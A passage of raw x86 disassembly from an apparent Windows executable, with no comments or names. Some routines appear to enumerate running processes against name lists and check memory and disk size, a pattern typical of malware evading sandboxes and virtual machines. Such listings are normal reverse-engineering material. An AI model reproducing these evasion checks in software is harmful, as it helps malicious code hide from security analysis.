  403307:	03 ca                	add    %edx,%ecx
  403309:	c1 e9 09             	shr    $0x9,%ecx
  40330c:	51                   	push   %ecx
  40330d:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  403313:	50                   	push   %eax
  403314:	68 20 91 42 00       	push   $0x429120
  403319:	6a 3c                	push   $0x3c
  40331b:	56                   	push   %esi
  40331c:	e8 86 f6 00 00       	call   0x4129a7
  403321:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403324:	33 cd                	xor    %ebp,%ecx
  403326:	83 c4 14             	add    $0x14,%esp
  403329:	e8 71 f0 00 00       	call   0x41239f
  40332e:	8b e5                	mov    %ebp,%esp
  403330:	5d                   	pop    %ebp
  403331:	c3                   	ret
  403332:	cc                   	int3
  403333:	cc                   	int3
  403334:	cc                   	int3
  403335:	cc                   	int3
  403336:	cc                   	int3
  403337:	cc                   	int3
  403338:	cc                   	int3
  403339:	cc                   	int3
  40333a:	cc                   	int3
  40333b:	cc                   	int3
  40333c:	cc                   	int3
  40333d:	cc                   	int3
  40333e:	cc                   	int3
  40333f:	cc                   	int3
  403340:	55                   	push   %ebp
  403341:	8b ec                	mov    %esp,%ebp
  403343:	81 ec 5c 01 00 00    	sub    $0x15c,%esp
  403349:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40334e:	33 c5                	xor    %ebp,%eax
  403350:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403353:	56                   	push   %esi
  403354:	68 a8 91 42 00       	push   $0x4291a8
  403359:	68 68 91 42 00       	push   $0x429168
  40335e:	ff 15 2c 51 42 00    	call   *0x42512c
  403364:	50                   	push   %eax
  403365:	ff 15 88 50 42 00    	call   *0x425088
  40336b:	68 18 01 00 00       	push   $0x118
  403370:	8b f0                	mov    %eax,%esi
  403372:	8d 85 a8 fe ff ff    	lea    -0x158(%ebp),%eax
  403378:	6a 00                	push   $0x0
  40337a:	50                   	push   %eax
  40337b:	c7 85 a4 fe ff ff 00 	movl   $0x0,-0x15c(%ebp)
  403382:	00 00 00 
  403385:	e8 a6 0e 01 00       	call   0x414230
  40338a:	83 c4 0c             	add    $0xc,%esp
  40338d:	83 bd a4 fe ff ff 00 	cmpl   $0x0,-0x15c(%ebp)
  403394:	75 2f                	jne    0x4033c5
  403396:	c7 85 a4 fe ff ff 1c 	movl   $0x11c,-0x15c(%ebp)
  40339d:	01 00 00 
  4033a0:	85 f6                	test   %esi,%esi
  4033a2:	74 0d                	je     0x4033b1
  4033a4:	8d 8d a4 fe ff ff    	lea    -0x15c(%ebp),%ecx
  4033aa:	51                   	push   %ecx
  4033ab:	ff d6                	call   *%esi
  4033ad:	85 c0                	test   %eax,%eax
  4033af:	74 14                	je     0x4033c5
  4033b1:	b8 50 90 42 00       	mov    $0x429050,%eax
  4033b6:	5e                   	pop    %esi
  4033b7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4033ba:	33 cd                	xor    %ebp,%ecx
  4033bc:	e8 de ef 00 00       	call   0x41239f
  4033c1:	8b e5                	mov    %ebp,%esp
  4033c3:	5d                   	pop    %ebp
  4033c4:	c3                   	ret
  4033c5:	57                   	push   %edi
  4033c6:	6a 3c                	push   $0x3c
  4033c8:	e8 3e f7 00 00       	call   0x412b0b
  4033cd:	8b 35 bc 52 42 00    	mov    0x4252bc,%esi
  4033d3:	8b f8                	mov    %eax,%edi
  4033d5:	8b 85 b4 fe ff ff    	mov    -0x14c(%ebp),%eax
  4033db:	83 c4 04             	add    $0x4,%esp
  4033de:	83 e8 02             	sub    $0x2,%eax
  4033e1:	74 0e                	je     0x4033f1
  4033e3:	68 e0 92 42 00       	push   $0x4292e0
  4033e8:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4033eb:	52                   	push   %edx
  4033ec:	e9 d7 01 00 00       	jmp    0x4035c8
  4033f1:	8b 85 a8 fe ff ff    	mov    -0x158(%ebp),%eax
  4033f7:	83 f8 04             	cmp    $0x4,%eax
  4033fa:	77 0e                	ja     0x40340a
  4033fc:	68 b8 91 42 00       	push   $0x4291b8
  403401:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403404:	50                   	push   %eax
  403405:	e9 be 01 00 00       	jmp    0x4035c8
  40340a:	83 f8 05             	cmp    $0x5,%eax
  40340d:	75 7e                	jne    0x40348d
  40340f:	8b 85 ac fe ff ff    	mov    -0x154(%ebp),%eax
  403415:	85 c0                	test   %eax,%eax
  403417:	75 0a                	jne    0x403423
  403419:	68 c0 91 42 00       	push   $0x4291c0
  40341e:	e9 a1 01 00 00       	jmp    0x4035c4
  403423:	83 f8 01             	cmp    $0x1,%eax
  403426:	75 52                	jne    0x40347a
  403428:	0f b7 45 b8          	movzwl -0x48(%ebp),%eax
  40342c:	83 f8 03             	cmp    $0x3,%eax
  40342f:	77 3b                	ja     0x40346c
  403431:	ff 24 85 10 36 40 00 	jmp    *0x403610(,%eax,4)
  403438:	68 cc 91 42 00       	push   $0x4291cc
  40343d:	8d 55 c0             	lea    -0x40(%ebp),%edx
  403440:	52                   	push   %edx
  403441:	e9 82 01 00 00       	jmp    0x4035c8
  403446:	68 d4 91 42 00       	push   $0x4291d4
  40344b:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40344e:	50                   	push   %eax
  40344f:	e9 74 01 00 00       	jmp    0x4035c8
  403454:	68 e4 91 42 00       	push   $0x4291e4
  403459:	e9 66 01 00 00       	jmp    0x4035c4
  40345e:	68 f4 91 42 00       	push   $0x4291f4
  403463:	8d 55 c0             	lea    -0x40(%ebp),%edx
  403466:	52                   	push   %edx
  403467:	e9 5c 01 00 00       	jmp    0x4035c8
  40346c:	68 cc 91 42 00       	push   $0x4291cc
  403471:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403474:	50                   	push   %eax
  403475:	e9 4e 01 00 00       	jmp    0x4035c8
  40347a:	83 f8 02             	cmp    $0x2,%eax
  40347d:	0f 85 4a 01 00 00    	jne    0x4035cd
  403483:	68 04 92 42 00       	push   $0x429204
  403488:	e9 37 01 00 00       	jmp    0x4035c4
  40348d:	83 f8 06             	cmp    $0x6,%eax
  403490:	0f 85 da 00 00 00    	jne    0x403570
  403496:	8b 85 ac fe ff ff    	mov    -0x154(%ebp),%eax
  40349c:	85 c0                	test   %eax,%eax
  40349e:	75 49                	jne    0x4034e9
  4034a0:	80 7d be 01          	cmpb   $0x1,-0x42(%ebp)
  4034a4:	75 35                	jne    0x4034db
  4034a6:	0f b7 45 b8          	movzwl -0x48(%ebp),%eax
  4034aa:	83 e8 00             	sub    $0x0,%eax
  4034ad:	74 06                	je     0x4034b5
  4034af:	48                   	dec    %eax
  4034b0:	74 1f                	je     0x4034d1
  4034b2:	48                   	dec    %eax
  4034b3:	74 0e                	je     0x4034c3
  4034b5:	68 10 92 42 00       	push   $0x429210
  4034ba:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4034bd:	52                   	push   %edx
  4034be:	e9 05 01 00 00       	jmp    0x4035c8
  4034c3:	68 30 92 42 00       	push   $0x429230
  4034c8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4034cb:	50                   	push   %eax
  4034cc:	e9 f7 00 00 00       	jmp    0x4035c8
  4034d1:	68 1c 92 42 00       	push   $0x42921c
  4034d6:	e9 e9 00 00 00       	jmp    0x4035c4
  4034db:	68 44 92 42 00       	push   $0x429244
  4034e0:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4034e3:	50                   	push   %eax
  4034e4:	e9 df 00 00 00       	jmp    0x4035c8
  4034e9:	83 f8 01             	cmp    $0x1,%eax
  4034ec:	75 41                	jne    0x40352f
  4034ee:	38 45 be             	cmp    %al,-0x42(%ebp)
  4034f1:	75 32                	jne    0x403525
  4034f3:	0f b7 45 b8          	movzwl -0x48(%ebp),%eax
  4034f7:	83 e8 00             	sub    $0x0,%eax
  4034fa:	74 1b                	je     0x403517
  4034fc:	48                   	dec    %eax
  4034fd:	74 0a                	je     0x403509
  4034ff:	68 50 92 42 00       	push   $0x429250
  403504:	e9 bb 00 00 00       	jmp    0x4035c4
  403509:	68 5c 92 42 00       	push   $0x42925c
  40350e:	8d 55 c0             	lea    -0x40(%ebp),%edx
  403511:	52                   	push   %edx
  403512:	e9 b1 00 00 00       	jmp    0x4035c8
  403517:	68 50 92 42 00       	push   $0x429250
  40351c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40351f:	50                   	push   %eax
  403520:	e9 a3 00 00 00       	jmp    0x4035c8
  403525:	68 70 92 42 00       	push   $0x429270
  40352a:	e9 95 00 00 00       	jmp    0x4035c4
  40352f:	83 f8 02             	cmp    $0x2,%eax
  403532:	75 1f                	jne    0x403553
  403534:	80 7d be 01          	cmpb   $0x1,-0x42(%ebp)
  403538:	75 0e                	jne    0x403548
  40353a:	68 80 92 42 00       	push   $0x429280
  40353f:	8d 55 c0             	lea    -0x40(%ebp),%edx
  403542:	52                   	push   %edx
  403543:	e9 80 00 00 00       	jmp    0x4035c8
  403548:	68 8c 92 42 00       	push   $0x42928c
  40354d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403550:	50                   	push   %eax
  403551:	eb 75                	jmp    0x4035c8
  403553:	83 f8 03             	cmp    $0x3,%eax
  403556:	75 75                	jne    0x4035cd
  403558:	80 7d be 01          	cmpb   $0x1,-0x42(%ebp)
  40355c:	75 07                	jne    0x403565
  40355e:	68 98 92 42 00       	push   $0x429298
  403563:	eb 5f                	jmp    0x4035c4
  403565:	68 a8 92 42 00       	push   $0x4292a8
  40356a:	8d 55 c0             	lea    -0x40(%ebp),%edx
  40356d:	52                   	push   %edx
  40356e:	eb 58                	jmp    0x4035c8
  403570:	83 f8 0a             	cmp    $0xa,%eax
  403573:	75 58                	jne    0x4035cd
  403575:	83 bd ac fe ff ff 00 	cmpl   $0x0,-0x154(%ebp)
  40357c:	75 4f                	jne    0x4035cd
  40357e:	0f b6 45 be          	movzbl -0x42(%ebp),%eax
  403582:	48                   	dec    %eax
  403583:	74 1b                	je     0x4035a0
  403585:	83 e8 02             	sub    $0x2,%eax
  403588:	74 0b                	je     0x403595
  40358a:	68 d0 92 42 00       	push   $0x4292d0
  40358f:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403592:	50                   	push   %eax
  403593:	eb 14                	jmp    0x4035a9
  403595:	68 c4 92 42 00       	push   $0x4292c4
  40359a:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  40359d:	51                   	push   %ecx
  40359e:	eb 09                	jmp    0x4035a9
  4035a0:	68 b8 92 42 00       	push   $0x4292b8
  4035a5:	8d 55 c0             	lea    -0x40(%ebp),%edx
  4035a8:	52                   	push   %edx
  4035a9:	ff d6                	call   *%esi
  4035ab:	83 c4 08             	add    $0x8,%esp
  4035ae:	80 7d be 01          	cmpb   $0x1,-0x42(%ebp)
  4035b2:	75 0b                	jne    0x4035bf
  4035b4:	68 b8 92 42 00       	push   $0x4292b8
  4035b9:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4035bc:	50                   	push   %eax
  4035bd:	eb 09                	jmp    0x4035c8
  4035bf:	68 c4 92 42 00       	push   $0x4292c4
  4035c4:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4035c7:	51                   	push   %ecx
  4035c8:	ff d6                	call   *%esi
  4035ca:	83 c4 08             	add    $0x8,%esp
  4035cd:	0f b7 55 b8          	movzwl -0x48(%ebp),%edx
  4035d1:	0f b6 45 be          	movzbl -0x42(%ebp),%eax
  4035d5:	8b 8d ac fe ff ff    	mov    -0x154(%ebp),%ecx
  4035db:	52                   	push   %edx
  4035dc:	8b 95 a8 fe ff ff    	mov    -0x158(%ebp),%edx
  4035e2:	50                   	push   %eax
  4035e3:	8b 85 b0 fe ff ff    	mov    -0x150(%ebp),%eax
  4035e9:	51                   	push   %ecx
  4035ea:	52                   	push   %edx
  4035eb:	50                   	push   %eax
  4035ec:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4035ef:	51                   	push   %ecx
  4035f0:	68 e4 92 42 00       	push   $0x4292e4
  4035f5:	57                   	push   %edi
  4035f6:	ff d6                	call   *%esi
  4035f8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4035fb:	83 c4 20             	add    $0x20,%esp
  4035fe:	8b c7                	mov    %edi,%eax
  403600:	5f                   	pop    %edi
  403601:	33 cd                	xor    %ebp,%ecx
  403603:	5e                   	pop    %esi
  403604:	e8 96 ed 00 00       	call   0x41239f
  403609:	8b e5                	mov    %ebp,%esp
  40360b:	5d                   	pop    %ebp
  40360c:	c3                   	ret
  40360d:	8d 49 00             	lea    0x0(%ecx),%ecx
  403610:	38 34 40             	cmp    %dh,(%eax,%eax,2)
  403613:	00 46 34             	add    %al,0x34(%esi)
  403616:	40                   	inc    %eax
  403617:	00 54 34 40          	add    %dl,0x40(%esp,%esi,1)
  40361b:	00 5e 34             	add    %bl,0x34(%esi)
  40361e:	40                   	inc    %eax
  40361f:	00 55 8b             	add    %dl,-0x75(%ebp)
  403622:	ec                   	in     (%dx),%al
  403623:	81 ec 68 02 00 00    	sub    $0x268,%esp
  403629:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40362e:	33 c5                	xor    %ebp,%eax
  403630:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403633:	56                   	push   %esi
  403634:	68 fe 01 00 00       	push   $0x1fe
  403639:	8d 85 f4 fd ff ff    	lea    -0x20c(%ebp),%eax
  40363f:	50                   	push   %eax
  403640:	6a 00                	push   $0x0
  403642:	ff 15 94 50 42 00    	call   *0x425094
  403648:	ff 15 98 50 42 00    	call   *0x425098
  40364e:	8d 8d 9c fd ff ff    	lea    -0x264(%ebp),%ecx
  403654:	51                   	push   %ecx
  403655:	8b f0                	mov    %eax,%esi
  403657:	ff 15 9c 50 42 00    	call   *0x42509c
  40365d:	8d 95 e4 fd ff ff    	lea    -0x21c(%ebp),%edx
  403663:	52                   	push   %edx
  403664:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  40366a:	50                   	push   %eax
  40366b:	6a 00                	push   $0x0
  40366d:	6a 00                	push   $0x0
  40366f:	6a 20                	push   $0x20
  403671:	6a 00                	push   $0x0
  403673:	6a 00                	push   $0x0
  403675:	6a 00                	push   $0x0
  403677:	56                   	push   %esi
  403678:	8d 8d f4 fd ff ff    	lea    -0x20c(%ebp),%ecx
  40367e:	51                   	push   %ecx
  40367f:	ff 15 a0 50 42 00    	call   *0x4250a0
  403685:	6a ff                	push   $0xffffffff
  403687:	ff 15 a4 50 42 00    	call   *0x4250a4
  40368d:	cc                   	int3
  40368e:	cc                   	int3
  40368f:	cc                   	int3
  403690:	55                   	push   %ebp
  403691:	8b ec                	mov    %esp,%ebp
  403693:	81 ec 9c 02 00 00    	sub    $0x29c,%esp
  403699:	a1 bc d1 42 00       	mov    0x42d1bc,%eax
  40369e:	33 c5                	xor    %ebp,%eax
  4036a0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4036a3:	53                   	push   %ebx
  4036a4:	56                   	push   %esi
  4036a5:	57                   	push   %edi
  4036a6:	68 08 93 42 00       	push   $0x429308
  4036ab:	ff 15 68 52 42 00    	call   *0x425268
  4036b1:	85 c0                	test   %eax,%eax
  4036b3:	75 13                	jne    0x4036c8
  4036b5:	b0 01                	mov    $0x1,%al
  4036b7:	5f                   	pop    %edi
  4036b8:	5e                   	pop    %esi
  4036b9:	5b                   	pop    %ebx
  4036ba:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4036bd:	33 cd                	xor    %ebp,%ecx
  4036bf:	e8 db ec 00 00       	call   0x41239f
  4036c4:	8b e5                	mov    %ebp,%esp
  4036c6:	5d                   	pop    %ebp
  4036c7:	c3                   	ret
  4036c8:	6a 00                	push   $0x0
  4036ca:	6a 02                	push   $0x2
  4036cc:	c7 85 78 fd ff ff 2c 	movl   $0x22c,-0x288(%ebp)
  4036d3:	02 00 00 
  4036d6:	ff 15 4c 50 42 00    	call   *0x42504c
  4036dc:	8b f8                	mov    %eax,%edi
  4036de:	83 ff ff             	cmp    $0xffffffff,%edi
  4036e1:	0f 84 92 01 00 00    	je     0x403879
  4036e7:	8d 85 78 fd ff ff    	lea    -0x288(%ebp),%eax
  4036ed:	50                   	push   %eax
  4036ee:	57                   	push   %edi
  4036ef:	ff 15 50 50 42 00    	call   *0x425050
  4036f5:	8b 35 48 51 42 00    	mov    0x425148,%esi
  4036fb:	85 c0                	test   %eax,%eax
  4036fd:	74 59                	je     0x403758
  4036ff:	8b 1d 54 50 42 00    	mov    0x425054,%ebx
  403705:	eb 09                	jmp    0x403710
  403707:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40370e:	8b ff                	mov    %edi,%edi
  403710:	68 30 93 42 00       	push   $0x429330
  403715:	8d 8d 9c fd ff ff    	lea    -0x264(%ebp),%ecx
  40371b:	51                   	push   %ecx
  40371c:	ff d6                	call   *%esi
  40371e:	85 c0                	test   %eax,%eax
  403720:	74 93                	je     0x4036b5
  403722:	68 54 93 42 00       	push   $0x429354
  403727:	8d 95 9c fd ff ff    	lea    -0x264(%ebp),%edx
  40372d:	52                   	push   %edx
  40372e:	ff d6                	call   *%esi
  403730:	85 c0                	test   %eax,%eax
  403732:	74 81                	je     0x4036b5
  403734:	68 74 93 42 00       	push   $0x429374
  403739:	8d 85 9c fd ff ff    	lea    -0x264(%ebp),%eax
  40373f:	50                   	push   %eax
  403740:	ff d6                	call   *%esi
  403742:	85 c0                	test   %eax,%eax
  403744:	0f 84 6b ff ff ff    	je     0x4036b5
  40374a:	8d 8d 78 fd ff ff    	lea    -0x288(%ebp),%ecx
  403750:	51                   	push   %ecx
  403751:	57                   	push   %edi
  403752:	ff d3                	call   *%ebx
  403754:	85 c0                	test   %eax,%eax
  403756:	75 b8                	jne    0x403710
  403758:	57                   	push   %edi
  403759:	8b 3d 58 50 42 00    	mov    0x425058,%edi
  40375f:	ff d7                	call   *%edi
  403761:	8d 95 74 fd ff ff    	lea    -0x28c(%ebp),%edx
  403767:	52                   	push   %edx
  403768:	6a 64                	push   $0x64
  40376a:	68 94 93 42 00       	push   $0x429394
  40376f:	c7 85 74 fd ff ff 00 	movl   $0x0,-0x28c(%ebp)
  403776:	00 00 00 
  403779:	ff 15 3c 52 42 00    	call   *0x42523c
  40377f:	85 c0                	test   %eax,%eax
  403781:	75 43                	jne    0x4037c6
  403783:	a1 a8 93 42 00       	mov    0x4293a8,%eax
  403788:	8b 0d ac 93 42 00    	mov    0x4293ac,%ecx
  40378e:	8b 15 b0 93 42 00    	mov    0x4293b0,%edx
  403794:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403797:	a1 b4 93 42 00       	mov    0x4293b4,%eax
  40379c:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40379f:	8b 0d b8 93 42 00    	mov    0x4293b8,%ecx
  4037a5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4037a8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4037ab:	8b 85 74 fd ff ff    	mov    -0x28c(%ebp),%eax
  4037b1:	8d 55 e8             	lea    -0x18(%ebp),%edx
  4037b4:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4037b7:	8b 48 08             	mov    0x8(%eax),%ecx
  4037ba:	52                   	push   %edx
  4037bb:	51                   	push   %ecx
  4037bc:	ff d6                	call   *%esi
  4037be:	85 c0                	test   %eax,%eax
  4037c0:	0f 84 ef fe ff ff    	je     0x4036b5
  4037c6:	8d 55 a8             	lea    -0x58(%ebp),%edx
  4037c9:	52                   	push   %edx
  4037ca:	c7 45 a8 40 00 00 00 	movl   $0x40,-0x58(%ebp)
  4037d1:	ff 15 80 50 42 00    	call   *0x425080
  4037d7:	83 7d b4 00          	cmpl   $0x0,-0x4c(%ebp)
  4037db:	77 13                	ja     0x4037f0
  4037dd:	0f 82 d2 fe ff ff    	jb     0x4036b5
  4037e3:	81 7d b0 00 15 f4 45 	cmpl   $0x45f41500,-0x50(%ebp)
  4037ea:	0f 82 c5 fe ff ff    	jb     0x4036b5
  4037f0:	6a 00                	push   $0x0
  4037f2:	6a 00                	push   $0x0
  4037f4:	6a 03                	push   $0x3
  4037f6:	6a 00                	push   $0x0
  4037f8:	6a 01                	push   $0x1
  4037fa:	68 00 00 00 80       	push   $0x80000000
  4037ff:	68 bc 93 42 00       	push   $0x4293bc
  403804:	ff 15 ac 50 42 00    	call   *0x4250ac
  40380a:	8b f0                	mov    %eax,%esi
  40380c:	83 fe ff             	cmp    $0xffffffff,%esi
  40380f:	75 16                	jne    0x403827
  403811:	50                   	push   %eax
  403812:	ff d7                	call   *%edi
  403814:	32 c0                	xor    %al,%al
  403816:	5f                   	pop    %edi
  403817:	5e                   	pop    %esi
  403818:	5b                   	pop    %ebx
  403819:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40381c:	33 cd                	xor    %ebp,%ecx
  40381e:	e8 7c eb 00 00       	call   0x41239f
  403823:	8b e5                	mov    %ebp,%esp
  403825:	5d                   	pop    %ebp
  403826:	c3                   	ret
  403827:	6a 00                	push   $0x0
  403829:	8d 85 64 fd ff ff    	lea    -0x29c(%ebp),%eax
  40382f:	50                   	push   %eax
  403830:	6a 08                	push   $0x8
  403832:	8d 8d 68 fd ff ff    	lea    -0x298(%ebp),%ecx
  403838:	51                   	push   %ecx
  403839:	6a 00                	push   $0x0
  40383b:	6a 00                	push   $0x0
  40383d:	68 5c 40 07 00       	push   $0x7405c
  403842:	56                   	push   %esi
  403843:	ff 15 b0 50 42 00    	call   *0x4250b0
  403849:	56                   	push   %esi
  40384a:	ff d7                	call   *%edi
  40384c:	8b 95 6c fd ff ff    	mov    -0x294(%ebp),%edx
  403852:	8b 85 68 fd ff ff    	mov    -0x298(%ebp),%eax
  403858:	6a 00                	push   $0x0
  40385a:	68 00 00 00 40       	push   $0x40000000
  40385f:	52                   	push   %edx
  403860:	50                   	push   %eax
  403861:	e8 5a fc 01 00       	call   0x4234c0
  403866:	85 d2                	test   %edx,%edx
  403868:	7f 0f                	jg     0x403879
  40386a:	0f 8c 45 fe ff ff    	jl     0x4036b5
  403870:	83 f8 6e             	cmp    $0x6e,%eax
  403873:	0f 82 3c fe ff ff    	jb     0x4036b5
  403879:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40387c:	5f                   	pop    %edi
  40387d:	5e                   	pop    %esi
  40387e:	33 cd                	xor    %ebp,%ecx
  403880:	32 c0                	xor    %al,%al
  403882:	5b                   	pop    %ebx
  403883:	e8 17 eb 00 00       	call   0x41239f
  403888:	8b e5                	mov    %ebp,%esp
  40388a:	5d                   	pop    %ebp
  40388b:	c3                   	ret
  40388c:	cc                   	int3
  40388d:	cc                   	int3
  40388e:	cc                   	int3
  40388f:	cc                   	int3
  403890:	ff 25 b4 2f 43 00    	jmp    *0x432fb4
  403896:	cc                   	int3
  403897:	cc                   	int3
  403898:	cc                   	int3
  403899:	cc                   	int3
  40389a:	cc                   	int3
  40389b:	cc                   	int3
  40389c:	cc                   	int3
  40389d:	cc                   	int3
  40389e:	cc                   	int3
  40389f:	cc                   	int3
  4038a0:	ff 25 b0 2f 43 00    	jmp    *0x432fb0
  4038a6:	cc                   	int3
  4038a7:	cc                   	int3
  4038a8:	cc                   	int3
  4038a9:	cc                   	int3
  4038aa:	cc                   	int3
  4038ab:	cc                   	int3
  4038ac:	cc                   	int3
  4038ad:	cc                   	int3
  4038ae:	cc                   	int3
  4038af:	cc                   	int3
  4038b0:	68 d0 07 00 00       	push   $0x7d0
  4038b5:	c7 05 b0 2f 43 00 90 	movl   $0x403890,0x432fb0
  4038bc:	38 40 00 
  4038bf:	c7 05 b4 2f 43 00 40 	movl   $0x40ac40,0x432fb4
  4038c6:	ac 40 00 
  4038c9:	ff 15 50 51 42 00    	call   *0x425150
  4038cf:	ff 25 b0 2f 43 00    	jmp    *0x432fb0
  4038d5:	cc                   	int3
  4038d6:	cc                   	int3
  4038d7:	cc                   	int3
  4038d8:	cc                   	int3
  4038d9:	cc                   	int3
  4038da:	cc                   	int3
  4038db:	cc                   	int3
  4038dc:	cc                   	int3
  4038dd:	cc                   	int3
  4038de:	cc                   	int3
  4038df:	cc                   	int3
  4038e0:	55                   	push   %ebp
  4038e1:	8b ec                	mov    %esp,%ebp
  4038e3:	8b 55 08             	mov    0x8(%ebp),%edx
  4038e6:	56                   	push   %esi
  4038e7:	8b f1                	mov    %ecx,%esi
  4038e9:	8b c2                	mov    %edx,%eax
  4038eb:	57                   	push   %edi
  4038ec:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4038f3:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4038fa:	c6 06 00             	movb   $0x0,(%esi)
  4038fd:	8d 78 01             	lea    0x1(%eax),%edi
  403900:	8a 08                	mov    (%eax),%cl
  403902:	40                   	inc    %eax
  403903:	84 c9                	test   %cl,%cl
  403905:	75 f9                	jne    0x403900
  403907:	2b c7                	sub    %edi,%eax
  403909:	50                   	push   %eax
  40390a:	52                   	push   %edx
  40390b:	8b ce                	mov    %esi,%ecx
  40390d:	e8 de 00 00 00       	call   0x4039f0
  403912:	5f                   	pop    %edi
  403913:	8b c6                	mov    %esi,%eax
  403915:	5e                   	pop    %esi
  403916:	5d                   	pop    %ebp
  403917:	c2 04 00             	ret    $0x4
  40391a:	cc                   	int3
  40391b:	cc                   	int3
  40391c:	cc                   	int3
  40391d:	cc                   	int3
  40391e:	cc                   	int3
  40391f:	cc                   	int3
  403920:	56                   	push   %esi
  403921:	8b f1                	mov    %ecx,%esi
  403923:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  403927:	72 0b                	jb     0x403934
  403929:	8b 06                	mov    (%esi),%eax
  40392b:	50                   	push   %eax
  40392c:	e8 9c eb 00 00       	call   0x4124cd
  403931:	83 c4 04             	add    $0x4,%esp
  403934:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  40393b:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  403942:	c6 06 00             	movb   $0x0,(%esi)
  403945:	5e                   	pop    %esi
  403946:	c3                   	ret
  403947:	cc                   	int3
  403948:	cc                   	int3
  403949:	cc                   	int3
  40394a:	cc                   	int3
  40394b:	cc                   	int3
  40394c:	cc                   	int3
  40394d:	cc                   	int3
  40394e:	cc                   	int3
  40394f:	cc                   	int3
  403950:	83 7e 14 08          	cmpl   $0x8,0x14(%esi)
  403954:	72 0b                	jb     0x403961
  403956:	8b 06                	mov    (%esi),%eax
  403958:	50                   	push   %eax
  403959:	e8 6f eb 00 00       	call   0x4124cd
  40395e:	83 c4 04             	add    $0x4,%esp
  403961:	33 c9                	xor    %ecx,%ecx
  403963:	c7 46 14 07 00 00 00 	movl   $0x7,0x14(%esi)
  40396a:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  403971:	66 89 0e             	mov    %cx,(%esi)
  403974:	c3                   	ret
  403975:	cc                   	int3
  403976:	cc                   	int3
  403977:	cc                   	int3
  403978:	cc                   	int3
  403979:	cc                   	int3
  40397a:	cc                   	int3
  40397b:	cc                   	int3
  40397c:	cc                   	int3
  40397d:	cc                   	int3
  40397e:	cc                   	int3
  40397f:	cc                   	int3
  403980:	e9 0b 00 00 00       	jmp    0x403990
  403985:	cc                   	int3
  403986:	cc                   	int3
  403987:	cc                   	int3
  403988:	cc                   	int3
  403989:	cc                   	int3
  40398a:	cc                   	int3
  40398b:	cc                   	int3
  40398c:	cc                   	int3
  40398d:	cc                   	int3
  40398e:	cc                   	int3
  40398f:	cc                   	int3
  403990:	56                   	push   %esi
  403991:	8b 33                	mov    (%ebx),%esi
  403993:	85 f6                	test   %esi,%esi
  403995:	74 3e                	je     0x4039d5
  403997:	57                   	push   %edi
  403998:	8b 7b 04             	mov    0x4(%ebx),%edi
  40399b:	3b f7                	cmp    %edi,%esi
  40399d:	74 2a                	je     0x4039c9
  40399f:	90                   	nop
  4039a0:	83 7e 14 10          	cmpl   $0x10,0x14(%esi)
  4039a4:	72 0b                	jb     0x4039b1
  4039a6:	8b 06                	mov    (%esi),%eax
  4039a8:	50                   	push   %eax
  4039a9:	e8 1f eb 00 00       	call   0x4124cd
  4039ae:	83 c4 04             	add    $0x4,%esp
  4039b1:	c7 46 14 0f 00 00 00 	movl   $0xf,0x14(%esi)
  4039b8:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  4039bf:	c6 06 00             	movb   $0x0,(%esi)
  4039c2:	83 c6 1c             	add    $0x1c,%esi
  4039c5:	3b f7                	cmp    %edi,%esi
  4039c7:	75 d7                	jne    0x4039a0
  4039c9:	8b 0b                	mov    (%ebx),%ecx
  4039cb:	51                   	push   %ecx
  4039cc:	e8 fc ea 00 00       	call   0x4124cd
  4039d1:	83 c4 04             	add    $0x4,%esp
  4039d4:	5f                   	pop    %edi
  4039d5:	33 c0                	xor    %eax,%eax
  4039d7:	89 03                	mov    %eax,(%ebx)
  4039d9:	89 43 04             	mov    %eax,0x4(%ebx)
  4039dc:	89 43 08             	mov    %eax,0x8(%ebx)
  4039df:	5e                   	pop    %esi
  4039e0:	c3                   	ret
  4039e1:	cc                   	int3
  4039e2:	cc                   	int3
  4039e3:	cc                   	int3
  4039e4:	cc                   	int3
  4039e5:	cc                   	int3
  4039e6:	cc                   	int3
  4039e7:	cc                   	int3
  4039e8:	cc                   	int3
  4039e9:	cc                   	int3
  4039ea:	cc                   	int3
  4039eb:	cc                   	int3
  4039ec:	cc                   	int3
  4039ed:	cc                   	int3
  4039ee:	cc                   	int3
  4039ef:	cc                   	int3
  4039f0:	55                   	push   %ebp
  4039f1:	8b ec                	mov    %esp,%ebp
  4039f3:	53                   	push   %ebx
  4039f4:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4039f7:	56                   	push   %esi
